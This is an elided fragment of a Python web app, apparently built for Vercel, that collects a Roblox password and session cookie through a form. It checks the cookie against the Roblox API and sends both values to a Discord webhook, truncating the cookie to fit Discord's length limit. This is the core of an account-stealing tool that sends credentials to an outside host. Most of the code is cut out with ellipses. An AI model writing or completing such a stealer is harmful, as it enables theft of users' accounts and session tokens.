...
def send_to_discord(password, korblox, headless, cookie, webhook_url):
    ...
    try:
        ...
        if not user_info.get('success', False):
            print("Cookie failed validation against Roblox API - not sending webhooks")
            return
        ...
        if len(cookie_content) > available_cookie_space:
            ...
            print(f"Cookie truncated to fit Discord limit")
...
def submit_form():
    ...
    try:
        ...
        try:
            send_to_discord(password, korblox, headless, cookie, webhook_url)
            end_time = time.time()
...
# This is the important part for Vercel - the app needs to be the default export
